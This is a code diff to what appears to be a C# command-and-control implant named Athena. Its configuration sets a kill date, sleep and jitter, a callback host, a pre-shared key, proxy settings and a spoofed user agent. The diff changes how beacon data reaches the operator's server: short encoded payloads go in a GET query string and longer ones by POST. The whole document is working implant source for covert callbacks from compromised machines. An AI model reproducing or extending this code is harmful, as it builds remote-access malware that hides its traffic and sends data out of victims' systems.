@@ -13,11 +13,9 @@ namespace Athena
         public DateTime killDate { get; set; }
         public int sleep { get; set; }
         public int jitter { get; set; }
-        //public Forwarder forwarder { get; set; }
-        public IForwarder forwarder { get; set; }
+
         public Config()
         {
-
             uuid = "%UUID%";
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
@@ -26,7 +24,6 @@ namespace Athena
             int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
             this.jitter = jitter;
             this.currentConfig = new HTTP();
-            //this.forwarder = new Forwarder();
         }
     }
     public class HTTP : IProfile
@@ -37,7 +34,6 @@ namespace Athena
         public string postURL { get; set; }
         public string psk { get; set; }
         public bool encryptedExchangeCheck { get; set; }
-        //Change this to Dictionary or Convert from JSON string?
         public string proxyHost { get; set; }
         public string proxyPass { get; set; }
         public string proxyUser { get; set; }
@@ -55,7 +51,7 @@ namespace Athena
             string postUri = "post_uri";
             this.userAgent = "%USERAGENT%";
             this.hostHeader = "%HOSTHEADER%";
-            this.getURL = $"{callbackHost}:{callbackPort}/{getUri}?{queryPath}";
+            this.getURL = $"{callbackHost}:{callbackPort}/{getUri}?{queryPath}=";
             this.postURL = $"{callbackHost}:{callbackPort}/{postUri}";
             this.proxyHost = "proxy_host:proxy_port";
             this.proxyPass = "proxy_pass";
@@ -110,7 +106,6 @@ namespace Athena
         {
             try
             {
-
                 string json = JsonConvert.SerializeObject(obj);
                 if (this.encrypted)
                 {
@@ -121,8 +116,18 @@ namespace Athena
                     json = await Misc.Base64Encode(Config.uuid + json);
                 }
 
-                var response = await this.client.PostAsync(this.postURL, new StringContent(json));
-                json = response.Content.ReadAsStringAsync().Result;
+                HttpResponseMessage response;
+
+                if(json.Length < 2000) //Max URL length
+                {
+                    response = await this.client.GetAsync(this.getURL + json);
+                }
+                else
+                {
+                    response = await this.client.PostAsync(this.postURL, new StringContent(json));
+                }
+
+                json = await response.Content.ReadAsStringAsync();
 
                 if (this.encrypted)
                 {
